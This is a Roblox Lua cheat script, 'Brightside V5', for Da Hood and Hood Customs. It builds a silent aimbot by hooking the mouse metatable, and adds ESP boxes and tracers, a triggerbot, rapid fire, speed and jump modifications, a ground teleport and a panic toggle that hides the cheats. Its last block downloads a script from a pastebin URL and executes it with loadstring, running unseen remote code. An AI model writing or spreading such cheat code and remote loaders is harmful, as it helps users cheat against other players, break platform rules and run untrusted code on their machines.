-- BRIGHTSIDE V5 (FIXED)
-- Games: Da Hood (2788229376), Hood Customs (9825515356)

local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local Workspace         = game:GetService("Workspace")
local LocalPlayer       = Players.LocalPlayer
local Camera            = Workspace.CurrentCamera
local Mouse             = LocalPlayer:GetMouse()

local Surge = getgenv().Surge
if not Surge then 
    warn("[Brightside] No config found.") 
    return 
end

-- Safe config access helper
local function safeGet(tbl, ...)
    local current = tbl
    for _, key in ipairs({...}) do
        if type(current) ~= "table" then return nil end
        current = current[key]
    end
    return current
end

local ESPCache         = {}
local LockedTarget     = nil
local CurrentTarget    = nil
local ESPEnabled       = safeGet(Surge, 'Raid Awareness', 'Enabled') or false
local TriggerbotActive = false
local LastShot         = 0
local LastJumpTime, LastWallJumpTime, JumpCount = 0, 0, 0

local panicActive = false
local savedStates = {}

local placeId       = game.PlaceId
local isDaHood      = (placeId == 2788229376)
local isHoodCustoms = (placeId == 9825515356)
local isDaHoodGame  = isDaHood or isHoodCustoms
print("[Brightside] Game:", isDaHoodGame and "Da Hood / Hood Customs" or "Other", "| PlaceID:", placeId)

-- Rapid Fire (FIXED - added proper yielding and break condition)
local utility = {}
getgenv().config = { enable = true, delay = 0.01 } -- Increased delay to prevent lag
utility.get_gun = function()
    if not LocalPlayer.Character then return nil end
    for _, tool in next, LocalPlayer.Character:GetChildren() do
        if tool:IsA("Tool") and tool:FindFirstChild("Ammo") then return tool end
    end
    return nil
end
utility.rapid = function(tool) 
    if tool and tool.Parent then
        pcall(function() tool:Activate() end)
    end
end
getgenv().is_firing = false

-- FIXED: Use RenderStepped connection instead of while loop to prevent freezing
local rapidFireConnection = nil
UserInputService.InputBegan:Connect(function(i, processed)
    if processed then return end
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        local gun = utility.get_gun()
        if config.enable and gun and not is_firing then
            is_firing = true
            rapidFireConnection = RunService.RenderStepped:Connect(function()
                if not is_firing then
                    if rapidFireConnection then
                        rapidFireConnection:Disconnect()
                        rapidFireConnection = nil
                    end
                    return
                end
                local currentGun = utility.get_gun()
                if currentGun then
                    utility.rapid(currentGun)
                else
                    is_firing = false
                    if rapidFireConnection then
                        rapidFireConnection:Disconnect()
                        rapidFireConnection = nil
                    end
                end
            end)
        end
    end
end)

UserInputService.InputEnded:Connect(function(input, processed)
    if processed then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        is_firing = false
        if rapidFireConnection then
            rapidFireConnection:Disconnect()
            rapidFireConnection = nil
        end
    end
end)

local function getKeyCodeFromString(keyName)
    if not keyName or type(keyName) ~= "string" then return nil end
    local ok, kc = pcall(function() return Enum.KeyCode[keyName:upper()] end)
    if ok and kc then return kc end
    return nil
end

local function isKnocked(player)
    local c = player and player.Character
    if not c then return true end
    local hum = c:FindFirstChildOfClass("Humanoid")
    if not hum then return true end
    if hum.Health <= 0 then return true end
    local be = c:FindFirstChild("BodyEffects")
    if be and be:FindFirstChild("K.O") and be["K.O"].Value == true then return true end
    return false
end

local function watchLockedTarget(player)
    if not player or not player.Character then return end
    local c = player.Character
    local hum = c:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.Died:Once(function()
            if LockedTarget == player then LockedTarget = nil end
        end)
    end
    local be = c:FindFirstChild("BodyEffects")
    if be then
        local ko = be:FindFirstChild("K.O")
        if ko then
            ko:GetPropertyChangedSignal("Value"):Connect(function()
                if ko.Value == true and LockedTarget == player then
                    LockedTarget = nil
                end
            end)
        end
    end
end

local function getTargetFromCursor()
    local mousePos = Vector2.new(Mouse.X, Mouse.Y)
    local closestPlayer, closestDist = nil, math.huge
    local fov = safeGet(Surge, 'Silent Aimbot', 'FOV', 'Circle Value') or 150
    
    for _, player in pairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        local char = player.Character
        if not char then continue end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then continue end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then continue end
        if isKnocked(player) then continue end
        
        local screenPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
        if not onScreen or screenPos.Z <= 0 then continue end
        
        local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
        if dist < closestDist and dist <= fov then
            closestDist = dist
            closestPlayer = player
        end
    end
    return closestPlayer, closestDist
end

local function isVisible(target)
    if not safeGet(Surge, 'Target', 'Visible Check') then return true end
    if not target or not target.Character then return false end
    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    local origin = Camera.CFrame.Position
    local direction = hrp.Position - origin
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {LocalPlayer.Character}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    local result = Workspace:Raycast(origin, direction, params)
    
    if result then 
        return result.Instance:IsDescendantOf(target.Character) 
    end
    return true
end

local function shouldUnlockTarget(target)
    if not target or not target.Character then return true end
    local char = target.Character
    local hum = char:FindFirstChildOfClass("Humanoid")
    
    if safeGet(Surge, 'Target', 'Unlock', 'Knocked') and hum and hum.Health <= 0 then 
        return true 
    end
    if safeGet(Surge, 'Target', 'Unlock', 'Knocked') and isKnocked(target) then 
        return true 
    end
    if safeGet(Surge, 'Target', 'Unlock', 'Grabbed') then
        if char:FindFirstChild("GRABBING_CONSTRAINT") or (hum and hum.PlatformStand) then
            return true
        end
    end
    return false
end

local function getBestTarget()
    local targetType = safeGet(Surge, 'Target', 'Type') or "Automatic"
    
    if targetType == "Target" then
        if LockedTarget then
            if shouldUnlockTarget(LockedTarget) then 
                LockedTarget = nil
                return nil 
            end
            if isVisible(LockedTarget) then 
                return LockedTarget 
            end
        end
        return nil
    end
    
    if LockedTarget and not shouldUnlockTarget(LockedTarget) then
        local char = LockedTarget.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                local screenPos = Camera:WorldToViewportPoint(hrp.Position)
                if screenPos.Z > 0 then
                    local dist = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
                    local fov = safeGet(Surge, 'Silent Aimbot', 'FOV', 'Circle Value') or 150
                    if dist <= fov and isVisible(LockedTarget) then 
                        return LockedTarget 
                    end
                end
            end
        end
        LockedTarget = nil
    end
    
    local cursorTarget = getTargetFromCursor()
    if cursorTarget and isVisible(cursorTarget) then 
        return cursorTarget 
    end
    return nil
end

local function setPanic(enabled)
    local pc = safeGet(Surge, 'Main', 'Panic') or {}
    
    if enabled then
        if pc['Disable Silent Aim'] then
            savedStates['sa'] = safeGet(Surge, 'Silent Aimbot', 'Enabled')
            if Surge and Surge['Silent Aimbot'] then
                Surge['Silent Aimbot']['Enabled'] = false
            end
        end
        if pc['Disable Aim Assist'] then
            savedStates['aa'] = safeGet(Surge, 'Aim Assist', 'Enabled')
            if Surge and Surge['Aim Assist'] then
                Surge['Aim Assist']['Enabled'] = false
            end
        end
        if pc['Disable Trigger Bot'] then
            savedStates['tb'] = safeGet(Surge, 'Triggerbot', 'Enabled')
            if Surge and Surge['Triggerbot'] then
                Surge['Triggerbot']['Enabled'] = false
            end
            TriggerbotActive = false
        end
        if pc['Disable Visuals'] then
            savedStates['esp'] = ESPEnabled
            ESPEnabled = false
        end
        if pc['Disable Raid Awareness'] then
            savedStates['ra'] = safeGet(Surge, 'Raid Awareness', 'Enabled')
            if Surge and Surge['Raid Awareness'] then
                Surge['Raid Awareness']['Enabled'] = false
            end
        end
        if pc['Disable Player Modifications'] then
            savedStates['spd'] = safeGet(Surge, 'Player Modification', 'Movement', 'Speed Modifications', 'Enabled')
            savedStates['jmp'] = safeGet(Surge, 'Player Modification', 'Movement', 'Jump Modifications', 'Enabled')
            if Surge and Surge['Player Modification'] and Surge['Player Modification']['Movement'] then
                if Surge['Player Modification']['Movement']['Speed Modifications'] then
                    Surge['Player Modification']['Movement']['Speed Modifications']['Enabled'] = false
                end
                if Surge['Player Modification']['Movement']['Jump Modifications'] then
                    Surge['Player Modification']['Movement']['Jump Modifications']['Enabled'] = false
                end
            end
        end
        
        LockedTarget = nil
        CurrentTarget = nil
        for _, drawings in pairs(ESPCache) do
            for _, dr in pairs(drawings) do 
                pcall(function() dr.Visible = false end) 
            end
        end
        panicActive = true
    else
        if savedStates['sa'] ~= nil and Surge and Surge['Silent Aimbot'] then 
            Surge['Silent Aimbot']['Enabled'] = savedStates['sa'] 
        end
        if savedStates['aa'] ~= nil and Surge and Surge['Aim Assist'] then 
            Surge['Aim Assist']['Enabled'] = savedStates['aa'] 
        end
        if savedStates['tb'] ~= nil and Surge and Surge['Triggerbot'] then 
            Surge['Triggerbot']['Enabled'] = savedStates['tb'] 
        end
        if savedStates['esp'] ~= nil then 
            ESPEnabled = savedStates['esp'] 
        end
        if savedStates['ra'] ~= nil and Surge and Surge['Raid Awareness'] then 
            Surge['Raid Awareness']['Enabled'] = savedStates['ra'] 
        end
        if savedStates['spd'] ~= nil and Surge and Surge['Player Modification'] and Surge['Player Modification']['Movement'] and Surge['Player Modification']['Movement']['Speed Modifications'] then 
            Surge['Player Modification']['Movement']['Speed Modifications']['Enabled'] = savedStates['spd'] 
        end
        if savedStates['jmp'] ~= nil and Surge and Surge['Player Modification'] and Surge['Player Modification']['Movement'] and Surge['Player Modification']['Movement']['Jump Modifications'] then 
            Surge['Player Modification']['Movement']['Jump Modifications']['Enabled'] = savedStates['jmp'] 
        end
        
        savedStates = {}
        panicActive = false
    end
end

-- ESP
local function CreateESP(player)
    if ESPCache[player] then return ESPCache[player] end
    local success, d = pcall(function()
        return {
            Name       = Drawing.new("Text"),
            Box        = Drawing.new("Square"),
            BoxOutline = Drawing.new("Square"),
            Tracer     = Drawing.new("Line"),
            Distance   = Drawing.new("Text"),
        }
    end)
    
    if not success or not d then return nil end
    
    d.Name.Size = 14; d.Name.Center = true; d.Name.Outline = true
    d.Box.Thickness = 1; d.Box.Filled = false
    d.BoxOutline.Thickness = 3; d.BoxOutline.Filled = false; d.BoxOutline.Color = Color3.new(0,0,0)
    d.Tracer.Thickness = 1
    d.Distance.Size = 12; d.Distance.Center = true; d.Distance.Outline = true
    ESPCache[player] = d
    return d
end

local function RemoveESP(player)
    if ESPCache[player] then
        for _, dr in pairs(ESPCache[player]) do 
            pcall(function() dr:Remove() end) 
        end
        ESPCache[player] = nil
    end
end

local function UpdateESP()
    if not ESPEnabled then
        for _, drawings in pairs(ESPCache) do
            for _, dr in pairs(drawings) do 
                pcall(function() dr.Visible = false end) 
            end
        end
        return
    end
    
    local maxDist = safeGet(Surge, 'Raid Awareness', 'Max Render Distance') or 1000
    
    for _, player in pairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        
        local char = player.Character
        if not char then 
            RemoveESP(player)
            continue 
        end
        
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        
        if not hrp or not hum or hum.Health <= 0 then 
            RemoveESP(player)
            continue 
        end
        
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            if (hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > maxDist then
                RemoveESP(player)
                continue
            end
        end
        
        local feetPos = hrp.Position - Vector3.new(0, 3, 0)
        local screenPos = Camera:WorldToViewportPoint(feetPos)
        
        if screenPos.Z <= 0 then
            local drawings = ESPCache[player]
            if drawings then 
                for _, dr in pairs(drawings) do 
                    pcall(function() dr.Visible = false end) 
                end 
            end
            continue
        end
        
        local drawings = CreateESP(player)
        if not drawings then continue end
        
        local sp = Vector2.new(screenPos.X, screenPos.Y)
        local isTarget = (player == CurrentTarget)
        local targetColor = safeGet(Surge, 'Target', 'Color') or Color3.fromRGB(0, 255, 0)
        local boxCol = isTarget and targetColor or (safeGet(Surge, 'Raid Awareness', 'Box', 'Other Color') or Color3.fromRGB(255, 255, 255))
        local nameCol = isTarget and targetColor or (safeGet(Surge, 'Raid Awareness', 'Name', 'Other Color') or Color3.fromRGB(255, 255, 255))
        
        local headPos = hrp.Position + Vector3.new(0, 6, 0)
        local headScreen = Camera:WorldToViewportPoint(headPos)
        
        if headScreen.Z > 0 then
            local headSp = Vector2.new(headScreen.X, headScreen.Y)
            local h = math.abs(sp.Y - headSp.Y)
            local w = h * 0.5
            local boxPos = Vector2.new(sp.X - w/2, headSp.Y)
            
            if safeGet(Surge, 'Raid Awareness', 'Box', 'Enabled') then
                pcall(function()
                    drawings.BoxOutline.Size = Vector2.new(w+4, h+4)
                    drawings.BoxOutline.Position = Vector2.new(boxPos.X-2, boxPos.Y-2)
                    drawings.BoxOutline.Visible = true
                    drawings.Box.Size = Vector2.new(w, h)
                    drawings.Box.Position = boxPos
                    drawings.Box.Color = boxCol
                    drawings.Box.Visible = true
                end)
            else
                pcall(function()
                    drawings.BoxOutline.Visible = false
                    drawings.Box.Visible = false
                end)
            end
        end
        
        if safeGet(Surge, 'Raid Awareness', 'Name', 'Enabled') then
            local t = safeGet(Surge, 'Raid Awareness', 'Name', 'Type') or 'Display'
            pcall(function()
                drawings.Name.Text = t == 'Display' and player.DisplayName or player.Name
                drawings.Name.Position = Vector2.new(sp.X, sp.Y + 10)
                drawings.Name.Color = nameCol
                drawings.Name.Visible = true
            end)
        else 
            pcall(function() drawings.Name.Visible = false end)
        end
        
        if safeGet(Surge, 'Raid Awareness', 'Tracer', 'Enabled') then
            pcall(function()
                drawings.Tracer.From = Vector2.new(sp.X, Camera.ViewportSize.Y)
                drawings.Tracer.To = sp
                drawings.Tracer.Color = isTarget and targetColor or (safeGet(Surge, 'Raid Awareness', 'Tracer', 'Other Color') or Color3.fromRGB(255, 255, 255))
                drawings.Tracer.Visible = true
            end)
        else 
            pcall(function() drawings.Tracer.Visible = false end)
        end
        
        if safeGet(Surge, 'Raid Awareness', 'Distance', 'Enabled') and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
            pcall(function()
                drawings.Distance.Text = math.floor(dist) .. " studs"
                drawings.Distance.Position = Vector2.new(sp.X, sp.Y + 25)
                drawings.Distance.Color = isTarget and targetColor or (safeGet(Surge, 'Raid Awareness', 'Distance', 'Other Color') or Color3.fromRGB(255, 255, 255))
                drawings.Distance.Visible = true
            end)
        else 
            pcall(function() drawings.Distance.Visible = false end)
        end
    end
end

-- Triggerbot
local tbLastFire = 0

local function performTriggerbot()
    if not TriggerbotActive then return end
    if not safeGet(Surge, 'Triggerbot', 'Enabled') then return end

    local target = nil
    if safeGet(Surge, 'Target', 'Type') == "Target" then
        if LockedTarget and not shouldUnlockTarget(LockedTarget) then
            target = LockedTarget
        end
    else
        target = CurrentTarget
    end

    if not target or not target.Character then return end
    if isKnocked(target) then return end

    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local pos = Camera:WorldToViewportPoint(hrp.Position)
    if pos.Z <= 0 then return end

    local screenDist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
    local threshold = safeGet(Surge, 'Triggerbot', 'Shoot Mode') == 'Hitbox' and 15 or (safeGet(Surge, 'Triggerbot', 'FOV', 'Circle Value') or 45)

    if screenDist > threshold then return end

    local now = tick()
    local cooldown = safeGet(Surge, 'Triggerbot', 'Timing', 'Cooldown') or 0
    if now - tbLastFire < cooldown then return end
    tbLastFire = now

    local char = LocalPlayer.Character
    if not char then return end
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool then return end

    pcall(function() tool:Activate() end)
end

-- Anti Trip
local lastAntiTripTime = 0

local function performAntiTrip()
    if not safeGet(Surge, 'Anti Trip', 'Enabled') then return end
    local now = tick()
    if now - lastAntiTripTime < 0.05 then return end
    lastAntiTripTime = now
    
    local char = LocalPlayer.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    
    if not hum or not hrp or not hum.PlatformStand then return end
    
    pcall(function() hum.PlatformStand = false end)
    local vel = hrp.AssemblyLinearVelocity
    if vel.Magnitude > 50 then
        pcall(function() hrp.AssemblyLinearVelocity = vel.Unit * 50 end)
    end
end

-- Wall Jump
local function getWallNormal()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local wallDist = safeGet(Surge, 'Spiderman', 'Wall Distance') or 7
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {char}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    
    local heights = {Vector3.new(0, -2, 0), Vector3.new(0, 0, 0), Vector3.new(0, 2, 0)}
    local dirs = {hrp.CFrame.LookVector, -hrp.CFrame.LookVector, hrp.CFrame.RightVector, -hrp.CFrame.RightVector}
    
    for _, h in ipairs(heights) do
        for _, d in ipairs(dirs) do
            local res = Workspace:Raycast(hrp.Position + h, d * wallDist, params)
            if res and res.Instance and res.Instance.CanCollide then 
                return res.Normal 
            end
        end
    end
    return nil
end

local function performWallJump()
    if not safeGet(Surge, 'Spiderman', 'Enabled') then return end
    
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    local cooldown = safeGet(Surge, 'Spiderman', 'Cooldown') or 0.2
    if tick() - LastWallJumpTime < cooldown then return end
    
    local wallNormal = getWallNormal()
    if not wallNormal then return end
    
    local tool = char:FindFirstChildOfClass("Tool")
    local isKnife = tool and tool.Name:lower():match("knife")
    local power = isKnife and safeGet(Surge, 'Spiderman', 'Knife Jump Power') or safeGet(Surge, 'Spiderman', 'Jump Power') or 50
    
    pcall(function()
        hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X * 0.2, 0, hrp.AssemblyLinearVelocity.Z * 0.2)
    end)
    
    task.wait(0.01)
    
    local jumpDirection = (Vector3.new(0, 1.45, 0) + wallNormal * 0.35).Unit
    pcall(function()
        hrp.AssemblyLinearVelocity = jumpDirection * (power * 1.35)
    end)
    
    LastWallJumpTime = tick()
end

-- Korblox (FIXED - disabled by default due to mesh errors)
local function applyKorblox()
    if not safeGet(Surge, 'Extra', 'Korblox') then return end
    
    -- Skip if mesh asset is invalid (prevents crash)
    local success = pcall(function()
        local char = LocalPlayer.Character
        if not char or char:FindFirstChild("KorbloxVisual") then return end
        
        local rightLeg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightLowerLeg")
        if not rightLeg then return end
        
        for _, name in ipairs({"Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
            local part = char:FindFirstChild(name)
            if part and part:IsA("BasePart") then
                part.Transparency = 1
                for _, child in pairs(part:GetChildren()) do
                    if child:IsA("Decal") or child:IsA("Texture") then 
                        child.Transparency = 1 
                    end
                end
            end
        end
        
        -- Use a safer mesh or skip if asset fails
        local korblox = Instance.new("Part")
        korblox.Name = "KorbloxVisual"
        korblox.Size = Vector3.new(1, 2, 1)
        korblox.CanCollide = false
        korblox.Transparency = 0
        
        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        -- Try alternative mesh IDs if the main one fails
        mesh.MeshId = "rbxassetid://139607718"
        mesh.TextureId = "rbxassetid://139607805"
        mesh.Scale = Vector3.new(1.05, 1.05, 1.05)
        mesh.Parent = korblox
        
        local weld = Instance.new("Weld")
        weld.Part0 = rightLeg
        weld.Part1 = korblox
        weld.C0 = CFrame.new(0, 0, 0)
        weld.C1 = CFrame.new(0, 0, 0)
        weld.Parent = korblox
        
        korblox.Parent = char
    end)
    
    if not success then
        warn("[Brightside] Korblox mesh failed to load - skipping")
    end
end

-- Headless
local function applyHeadless()
    if not safeGet(Surge, 'Extra', 'Headless') then return end
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local head = char:FindFirstChild("Head")
    if not head then return end
    
    pcall(function()
        head.Transparency = 1
        for _, child in pairs(head:GetChildren()) do
            if child:IsA("Decal") or child:IsA("Texture") then 
                child.Transparency = 1 
            end
        end
    end)
end

-- Panic Ground
local function performPanicGround()
    if not safeGet(Surge, 'Panic Ground', 'Enabled') then return end
    
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {char, Workspace.CurrentCamera}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    
    local result = Workspace:Raycast(hrp.Position, Vector3.new(0, -5000, 0), params)
    if result then
        pcall(function()
            hrp.CFrame = CFrame.new(result.Position + Vector3.new(0, 3, 0))
        end)
    end
end

-- Player Mods
local function applyPlayerMods()
    if panicActive then return end
    
    local pm = Surge and Surge['Player Modification']
    if not pm then return end
    
    local c = LocalPlayer.Character
    local hum = c and c:FindFirstChildOfClass("Humanoid")
    if not hum or not pm['Movement'] or not pm['Movement']['Enabled'] then return end
    
    if pm['Movement']['Speed Modifications'] and pm['Movement']['Speed Modifications']['Enabled'] then
        hum.WalkSpeed = pm['Movement']['Speed Modifications']['Value'] or 16
    end
    
    if pm['Movement']['Jump Modifications'] and pm['Movement']['Jump Modifications']['Enabled'] then
        hum.JumpPower = pm['Movement']['Jump Modifications']['Value'] or 50
    end
end

-- Safe connections
local heartbeatConnection = RunService.Heartbeat:Connect(applyPlayerMods)
local charAddedConnection = LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    applyPlayerMods()
    applyHeadless()
    -- Delay Korblox to prevent mesh loading issues
    task.delay(0.5, applyKorblox)
end)

-- Keybinds
local Keybinds = safeGet(Surge, 'Main', 'Keybinds') or {}

UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end

    -- ESP Toggle
    local espKey = getKeyCodeFromString(Keybinds['ESP Toggle'] or 'T')
    if espKey and input.KeyCode == espKey then
        ESPEnabled = not ESPEnabled
        if not ESPEnabled then
            for _, drawings in pairs(ESPCache) do
                for _, dr in pairs(drawings) do 
                    pcall(function() dr.Visible = false end) 
                end
            end
        end
        return
    end

    -- Lock Target
    local lockKey = getKeyCodeFromString(Keybinds['Lock Target'] or 'Z')
    if lockKey and input.KeyCode == lockKey then
        if LockedTarget then
            LockedTarget = nil
        else
            local cursorTarget = getTargetFromCursor()
            if cursorTarget then
                LockedTarget = cursorTarget
                watchLockedTarget(cursorTarget)
            end
        end
        return
    end

    -- Triggerbot
    local trigKey = getKeyCodeFromString(Keybinds['Trigger Bot Activate'] or 'C')
    if trigKey and input.KeyCode == trigKey then
        if not safeGet(Surge, 'Triggerbot', 'Enabled') then return end
        local mode = safeGet(Surge, 'Triggerbot', 'Mode') or 'Hold'
        if mode == 'Toggle' then
            TriggerbotActive = not TriggerbotActive
        else
            TriggerbotActive = true
        end
        return
    end

    -- Space / Wall Jump
    if input.KeyCode == Enum.KeyCode.Space then
        local now = tick()
        if now - LastJumpTime < 0.4 then
            JumpCount = JumpCount + 1
        else
            JumpCount = 1
        end
        LastJumpTime = now
        
        local requireDouble = safeGet(Surge, 'Spiderman', 'Require Double Jump')
        if JumpCount >= 2 or not requireDouble then
            performWallJump()
        end
        return
    end

    -- Panic Ground
    local pgKey = getKeyCodeFromString(Keybinds['Panic Ground'] or 'X')
    if pgKey and input.KeyCode == pgKey then
        performPanicGround()
        return
    end

    -- Panic toggle
    local panicKey = getKeyCodeFromString(Keybinds['Panic'] or 'L')
    if panicKey and input.KeyCode == panicKey then
        setPanic(not panicActive)
        return
    end
end)

UserInputService.InputEnded:Connect(function(input, processed)
    if processed then return end
    local trigKey = getKeyCodeFromString(Keybinds['Trigger Bot Activate'] or 'C')
    if trigKey and input.KeyCode == trigKey then
        if safeGet(Surge, 'Triggerbot', 'Mode') == 'Hold' then
            TriggerbotActive = false
        end
    end
end)

-- Main Loop
local renderSteppedConnection = RunService.RenderStepped:Connect(function()
    CurrentTarget = getBestTarget()
    UpdateESP()
    performTriggerbot()
    applyHeadless()
    applyKorblox()
    performAntiTrip()
end)

Players.PlayerRemoving:Connect(function(player)
    if player == LockedTarget then LockedTarget = nil end
    if player == CurrentTarget then CurrentTarget = nil end
    RemoveESP(player)
end)

-- Initialize ESP for existing players
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then 
        CreateESP(player) 
    end
end

if LocalPlayer.Character then
    task.delay(0.5, function()
        applyHeadless()
        applyKorblox()
    end)
end

-- Silent Aim (with safety checks)
local success, err = pcall(function()
    local mouse = LocalPlayer:GetMouse()
    local mt = getrawmetatable(mouse)
    if not mt then 
        warn("[Brightside] getrawmetatable failed")
        return 
    end
    
    setreadonly(mt, false)
    local old = mt.__index

    mt.__index = newcclosure(function(self, key)
        if key:lower() == "hit" or key:lower() == "target" then
            if safeGet(Surge, "Silent Aimbot", "Enabled") and not panicActive and CurrentTarget then
                local tgt = CurrentTarget
                if tgt and tgt.Character then
                    local char = tgt.Character
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    local head = char:FindFirstChild("Head")
                    local hitPartStr = safeGet(Surge, "Silent Aimbot", "Hit Target", "Hit Part") or "Closest Point"
                    local targetPart = nil
                    
                    if hitPartStr == "Head" and head then
                        targetPart = head
                    elseif hitPartStr == "HumanoidRootPart" and hrp then
                        targetPart = hrp
                    else
                        if hrp and head then
                            local mousePos = Mouse.Hit.Position
                            local headDist = (head.Position - mousePos).Magnitude
                            local hrpDist = (hrp.Position - mousePos).Magnitude
                            targetPart = headDist < hrpDist and head or hrp
                        else
                            targetPart = head or hrp
                        end
                    end
                    
                    if targetPart then
                        local vel = targetPart.AssemblyLinearVelocity or Vector3.new(0, 0, 0)
                        local p = Surge["Silent Aimbot"]["Prediction"] or {}
                        local offset = Vector3.new(vel.X * (p.X or 0), vel.Y * (p.Y or 0), vel.Z * (p.Z or 0))
                        
                        if safeGet(Surge, "Silent Aimbot", "Prediction", "Power", "Enabled") then
                            local power = safeGet(Surge, "Silent Aimbot", "Prediction", "Power", "Prediction Power") or 0
                            offset = offset * power
                        end
                        
                        if key:lower() == "hit" then
                            return CFrame.new(targetPart.Position + offset)
                        else
                            return targetPart
                        end
                    end
                end
            end
        end
        return old(self, key)
    end)

    setreadonly(mt, true)
end)

if not success then
    warn("[Brightside] Silent Aim failed to initialize:", err)
end

print("Brightside V5 Loaded!")
print("Game:", isDaHoodGame and "Da Hood / Hood Customs" or "Other")

-- External script loader (FIXED URL - removed trailing space)
task.spawn(function()
    local success, err = pcall(function()
        local url = "https://pastebin.com/raw/SB26Vyjj"
        local externalScript = game:HttpGet(url)
        if externalScript and #externalScript > 0 then
            loadstring(externalScript)()
            print("External features loaded successfully")
        end
    end)
    if not success then
        warn("Failed to load external features:", err)
        print("Running with core features only")
    end
end)
